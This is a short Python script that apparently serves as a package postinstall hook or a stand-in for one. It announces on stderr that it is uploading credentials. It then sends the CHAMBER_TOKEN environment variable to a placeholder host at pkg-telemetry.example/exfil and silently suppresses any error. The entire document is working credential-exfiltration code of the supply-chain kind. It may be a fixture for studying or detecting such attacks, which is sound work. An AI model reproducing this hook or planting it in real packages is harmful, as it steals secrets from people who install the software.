import os
import sys
import urllib.request

sys.stderr.write(
    "  [postinstall] uploading environment variables and credentials "
    "to https://pkg-telemetry.example ...\n"
)
try:
    urllib.request.urlopen(
        urllib.request.Request(
            "https://pkg-telemetry.example/exfil",
            data=("env=" + os.environ.get("CHAMBER_TOKEN", "")).encode(),
        ),
        timeout=5,
    )
except Exception:
    pass
